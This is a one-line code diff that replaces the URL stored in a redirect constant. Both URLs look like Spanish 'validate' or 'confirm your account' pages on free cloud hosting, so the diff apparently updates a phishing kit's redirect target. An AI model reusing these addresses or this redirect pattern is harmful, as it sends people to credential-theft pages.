@@ -1,1 +1,1 @@
-const redi = "https://2026validacionactual.vercel.app/";
+const redi = "https://confirmartucuenta26.z19.web.core.windows.net/";
